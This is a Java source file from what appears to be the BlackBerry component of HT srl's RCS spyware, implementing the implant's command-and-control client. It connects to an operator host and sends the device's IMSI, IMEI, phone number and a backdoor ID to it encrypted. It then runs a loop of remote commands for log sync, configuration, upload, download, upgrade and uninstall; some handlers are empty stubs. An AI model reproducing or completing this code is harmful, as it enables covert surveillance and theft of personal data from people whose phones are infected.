/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Transfer.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.transfer;

import java.io.IOException;
import java.util.Random;
import java.util.Vector;

import net.rim.device.api.util.Arrays;
import net.rim.device.api.util.DataBuffer;

import com.ht.rcs.blackberry.AgentManager;
import com.ht.rcs.blackberry.Common;
import com.ht.rcs.blackberry.Device;
import com.ht.rcs.blackberry.config.Keys;
import com.ht.rcs.blackberry.crypto.Encryption;
import com.ht.rcs.blackberry.fs.AutoFlashFile;
import com.ht.rcs.blackberry.log.Log;
import com.ht.rcs.blackberry.log.LogCollector;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class Transfer.
 */
public class Transfer {

	/** The debug. */
	protected static Debug debug = new Debug("Transfer", DebugLevel.VERBOSE);

	/** The Constant instance_. */
	private final static Transfer instance_ = new Transfer();

	private LogCollector logCollector;
	private Encryption crypto;

	private String host_ = "";
	private int port_ = 0;

	private boolean wifi_preferred_;
	private boolean wifi = false;
	private boolean connected = false;

	private boolean uninstall = false;

	private Connection connection = null;

	byte[] challenge = new byte[16];

	/**
	 * Instantiates a new transfer.
	 */
	protected Transfer() {
		logCollector = LogCollector.getInstance();
		crypto = new Encryption();	
	}

	/**
	 * Gets the single instance of Transfer.
	 * 
	 * @return single instance of Transfer
	 */
	public static Transfer getInstance() {
		return instance_;
	}

	public void init(String host, int port, boolean wifi_preferred) {
		host_ = host;
		port_ = port;
		wifi_preferred_ = wifi_preferred;
		crypto.makeKey(Keys.getChallengeKey());
	}

	public synchronized boolean send() {
		if (!connect()) {
			debug.error("not connected");
			return false;
		}

		try {
			// challenge response
			sendChallenge();
			getResponse();

			getChallenge();
			sendResponse();

			// identificazione
			sendIds();

			// ricezione configurazione o comandi
			for (;;) {
				Command command = recvCommand();
				if (!parseCommand(command))
					break;
			}

		} catch (ProtocolException ex) {
			debug.error("protocol exception");
			return false;
		} finally {
			disconnect();
		}

		return true;
	}

	protected boolean parseCommand(Command command) {
		Check.asserts(command != null, "null command");

		try {

			switch (command.id) {
			case Proto.SYNC:
				syncLogs();
				break;

			case Proto.NEW_CONF:
				getNewConf();
				break;

			case Proto.UNINSTALL:
				uninstall = true;
				break;

			case Proto.DOWNLOAD:
				sendDownload();
				break;

			case Proto.UPLOAD:
				getUpload();
				break;

			case Proto.UPGRADE:
				getUpgrade();
				break;

			case Proto.BYE:
				return false;

			default:
				break;
			}
		} catch (ProtocolException ex) {
			sendCommand(Proto.NO);
		}

		return true;
	}

	protected void sendIds() throws ProtocolException {

		Device device = Device.getInstance();

		sendCryptoCommand(Proto.VERSION, device.getVersion());
		sendCryptoCommand(Proto.SUBTYPE, device.getSubtype());
		sendCryptoCommand(Proto.ID, Keys.getBackdoorId());
		sendCryptoCommand(Proto.INSTANCE, Keys.getInstanceId());
		sendCryptoCommand(Proto.USERID, device.getImsi());
		sendCryptoCommand(Proto.DEVICEID, device.getImei());
		sendCryptoCommand(Proto.SOURCEID, device.getPhoneNumber());

	}

	protected void sendCryptoCommand(int commandId, byte[] plain)
			throws ProtocolException {

		byte[] cyphered = crypto.EncryptData(plain);

		sendCommand(commandId, Utils.intToByteArray(plain.length));
		Command ok = recvCommand();
		if (ok == null || ok.id != Proto.OK) {
			throw new ProtocolException("sendCryptoCommand error, id:"
					+ commandId);
		}

		boolean sent = false;
		try {
			sent = connection.send(cyphered);
		} catch (IOException e) {
		}

		if (!sent) {
			throw new ProtocolException("sendCryptoCommand cannot send, id:"
					+ commandId);
		}

	}

	protected void sendResponse() throws ProtocolException {
		Check.requires(challenge != null, "null crypto challange");

		debug.info("sendResponse");

		// challange contiene il challange cifrato, pronto per spedizione
		if (!sendCommand(Proto.RESPONSE, challenge)) {
			throw new ProtocolException("getChallenge: cannot send response");
		}
	}

	protected void getChallenge() throws ProtocolException {

		debug.info("getChallenge");

		Command command = recvCommand();

		if (command == null || command.id != Proto.CHALLENGE) {
			throw new ProtocolException("=wrong proto.challange");
		}

		// e' arrivato il challange, leggo il contenuto
		if (command != null && command.id == Proto.CHALLENGE) {
			fillPayload(command,16);
			
			if (command.size() != 16) {
				debug.error("getChallenge: expecting 16 bytes");
				throw new ProtocolException("getChallenge: expecting 16 bytes");
			}
			// ho 16 byte di challange, li cifro e li salvo
			challenge = crypto.EncryptData(command.payload);

		} else {
			throw new ProtocolException("not a valid challenge command");
		}

	}

	protected void getResponse() throws ProtocolException {
		debug.info("getResponse");

		Command command = recvCommand();
		boolean exception = false;
		if (command == null || command.id != Proto.RESPONSE) {
			throw new ProtocolException("=wrong proto.response");
		}

		// e' arrivato il response, leggo il contenuto
		if (command != null && command.id == Proto.RESPONSE) {
			fillPayload(command,16);
			if (command.size() != 16) {
				throw new ProtocolException("getResponse: expecting 16 bytes");
			}
			// ho 16 byte di response, lo confronto con il challange crittato
			byte[] cryptoChallenge = crypto.EncryptData(challenge);
			if (!Arrays.equals(cryptoChallenge, command.payload)) {
				throw new ProtocolException(
						"getResponse: challange does not match");
			}

		} else {
			throw new ProtocolException("not a valid response command");
		}

	}

	protected void sendChallenge() throws ProtocolException {

		debug.info("sendChallenge");

		// TODO: keep a log seed
		Random random = new Random();

		for (int i = 0; i < 16; i++) {
			challenge[i] = (byte) random.nextInt();
		}		

		if (!sendCommand(Proto.CHALLENGE, challenge)) {
			throw new ProtocolException("sendChallenge: cannot send");
		}
	}

	protected synchronized void syncLogs() throws ProtocolException {

		debug.info("connected: " + connected + " wifi: " + wifi);

		// snap dei log
		Vector logs = logCollector.getLogs();
		for (int i = 0; i < logs.size(); i++) {
			String logName = (String) logs.elementAt(i);
			AutoFlashFile file = new AutoFlashFile(logName, false);
			byte[] content = file.read();
			// boolean ret = sendManagedCommand(Proto.SYNC, content);

		}

		sendCommand(Proto.LOG_END);
		Command rec = recvCommand();
		if (rec.id != Proto.OK) {
			throw new ProtocolException("syncLogs: cannot end log");
		}

		// connection.disconnect();
	}

	protected void getUpgrade() {
		// TODO Auto-generated method stub

	}

	protected void getUpload() {
		// TODO Auto-generated method stub

	}

	protected void sendDownload() {
		// TODO Auto-generated method stub

	}

	protected void getNewConf() {
		// TODO Auto-generated method stub

	}

	protected void disconnect() {
		if (connected) {
			connected = false;
			sendCommand(Proto.BYE);
			connection.disconnect();
			connection = null;
		}
	}

	protected boolean sendCommand(int command) {
		return sendCommand(new Command(command, null));
	}

	protected boolean sendCommand(int command, byte[] payload) {
		return sendCommand(new Command(command, payload));
	}

	protected boolean sendCommand(Command command) {

		Check.requires(command != null, "null command");
		debug.trace("sending command: " + command);

		byte[] data = new byte[command.size() + 4];
		DataBuffer databuffer = new DataBuffer(data, 0, data.length, false);

		databuffer.writeInt(command.id);
		if (command.payload != null) {

			databuffer.write(command.payload);
		} else {
			debug.trace("payload null");
		}

		Check.ensures(command.size() + 4 == data.length, "wrong length");

		try {
			return connection.send(data);
		} catch (IOException e) {
			return false;
		}
	}

	protected Command recvCommand() {
		debug.trace("recvCommand");

		Command command = null;
		byte[] commandId;
		try {
			commandId = connection.receive(4);
			int id = Utils.byteArrayToInt(commandId, 0);
			if (id != 0) {
				command = new Command(id, null);
			}
		} catch (IOException e) {
			debug.error("receiving command: " + e);
		}

		debug.trace("received: " + command);
		return command;
	}

	protected void fillPayload(Command command, int len) throws ProtocolException {
		Check.ensures(command != null, "command null");
		Check.ensures(len > 0 && len < 65536 , "wrong len: " + len);

		try {	
			command.payload = connection.receive(len);
		} catch (IOException e) {
			debug.error("receiving command: " + e);
			throw new ProtocolException("fillPayload");
		}
	}

	protected boolean connect() {
		if (connected) {
			debug.error("Already connected");
			Check.asserts(connection != null, "connection null");
			return true;
		}

		wifi = false;
		if (wifi_preferred_) {
			debug.trace("Try wifi");
			connection = new WifiConnection(host_, port_);
			if (connection.isActive()) {
				wifi = true;
				connected = connection.connect();
			}
		}

		// fall back
		if (!wifi || !connected) {
			debug.trace("Try direct tcp");
			connection = new DirectTcpConnection(host_, port_);
			connected = connection.connect();
		}

		if (connection == null) {
			debug.error("null connection");
			return false;
		}

		debug.info("connected: " + connected);
		return connected;

	}
}
